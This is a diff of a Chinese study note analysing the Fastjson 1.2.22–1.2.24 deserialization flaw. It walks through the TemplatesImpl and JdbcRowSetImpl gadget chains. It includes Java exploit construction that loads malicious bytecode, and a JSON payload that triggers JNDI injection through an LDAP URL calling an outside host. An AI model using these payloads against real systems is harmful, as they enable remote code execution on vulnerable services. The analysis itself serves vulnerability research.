@@ -1,4 +1,4 @@
-# FastJson1.2.22-1.2.24 反序列化分析
+# 2.2FastJson1.2.22-1.2.24 反序列化分析
 
 ## 1.漏洞原理
 
@@ -10,25 +10,15 @@ Fastjson通过parse、parseObject处理以json结构传入的类的字符串形�
 
 ### 2.1 TemplateImpl
 
-#### (1).环境配置
-
-```xml
-  <dependency>
-      <groupId>com.alibaba</groupId>
-      <artifactId>fastjson</artifactId>
-      <version>1.2.22</version>
-  </dependency>
-```
-
-#### (2).利用链分析
+#### (1).利用链分析
 
 在CC3中，有涉及到关于`TemplatesImpl`链的利用，其中涉及到3个变量为：`_name、_bytecodes、_tfactory`。在刚开始的漏洞原理中提到，fastjson在解析json字符串的时候，会去调用getter方法，
 
 所以说，只解析的json字符串中存在`_outputProperties`的键值对，那么在解析的过程中会调用到`TemplatesImpl#getOutputProperties()`，代码如下：
 
-![image-20240416150617547](./img/image-20240416150617547.png)
+<img src="./img/image-20240416150617547.png" alt="image-20240416150617547" style="zoom:89%;" />
 
-然后再接着调用`newTransformer()`后就是字节码的加载，这部分内容可以参考CC3,了解这一点之后，可能会想立马构造payload，但是能成功吗？如果进行的构造如下：
+然后再接着调用`newTransformer()`后就是字节码的加载，这部分内容可以参考CC3,了解这一点之后，可能会想立马构造exp，但是能成功吗？如果进行的构造如下：
 
 ```java
   byte[] bytes = Files.readAllBytes(Paths.get("Exp.class"));
@@ -47,17 +37,17 @@ Fastjson通过parse、parseObject处理以json结构传入的类的字符串形�
 
 在FastJson解析过程中，关键代码位于`DefaultJSONParser#parseObject()`中，其中关键位置如下：
 
-![image-20240416151603853](./img/image-20240416151603853.png)
+<img src="./img/image-20240416151603853.png" alt="image-20240416151603853" style="zoom:50%;" />
 
 在该位置，通过传入的`@type`获取到需要转化的类，对于后续版本中，该类还会涉及到黑名单的绕过。
 
 往下就涉及到field的处理，主要的处理方式是在于`ObjectArrayCodec#deserialze(...)`中
 
-![image-20240416155420886](./img/image-20240416155420886.png)
+<img src="./img/image-20240416155420886.png" alt="image-20240416155420886" style="zoom:59%;" />
 
 传入后会先判断token的类型，然后采取指定的操作方式，例如：传入的是`_bytecodes`后会进行base64解码：
 
-![image-20240416155239841](./img/image-20240416155239841.png)
+<img src="./img/image-20240416155239841.png" alt="image-20240416155239841" style="zoom:87%;" />
 
 根据以上的分析，这个构造方式就很清晰的：
 
@@ -65,7 +55,7 @@ Fastjson通过parse、parseObject处理以json结构传入的类的字符串形�
 2. 为了触发getter，需要定义`_outputProperties`
 3. `_bytecodes`赋值的时候存在base64解码，需要编码。
 
-修改以上的payload，增加一个base64编码即可：
+修改以上的exp，增加一个base64编码即可：
 
 ```java
   byte[] bytes = Files.readAllBytes(Paths.get("/Users/me7eorite/Documents/GitHub/Learning-Demo/JavaStudy/target/classes/Exp.class"));
@@ -80,17 +70,28 @@ Fastjson通过parse、parseObject处理以json结构传入的类的字符串形�
   Object obj = JSON.parseObject(text,Feature.SupportNonPublicField);
 ```
 
-这里还涉及到一点，由于配置是是类中的私有字段，需要配置`Feature.SupportNonPublicField`。
+当构造上述exp的时，或许会产生疑问：构造fastjson反序列化自动调用setter？但是，类中并没有`SetName()`。为什么还能够正常赋值？
 
-### 2.2 JdbcRowSetImpl
+因为,增加配置`Feature.SupportNonPublicField`到私有属性会通过反射赋值，其代码位于`FieldDeserializer#setValue(...)`。部分代码如下：
 
-#### (1).环境配置
+![image-20240416220724322](./img/image-20240416220724322.png)
 
+## 2.2 JdbcRowSetImpl
 
+### (1).利用链分析
 
+```java
+String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://0.0.0.0:1389/owst18\",\"autoCommit\":true}";
+JSONObject.parse(payload);
+```
 
+根据之前的分析，FastJson反序列化的时候会调用setter，在该exp中，通过`setAutoCommit(...)`调用到`this.connect()`
 
+![image-20240416231849467](./img/image-20240416231849467.png)
 
+在`this.connect()`中，存在var1.lookup(...)，判断如果参数可控，这个位置是可以触发JNDI注入的。
 
-#### (2).利用链分析
+![image-20240416231932496](./img/image-20240416231932496.png)
+
+配置一个dataSourceName，需要注意的是在exp中这键值对的顺序是不能够随意变化的，FastJson反序列化的时候会按照顺序调用setter。
 
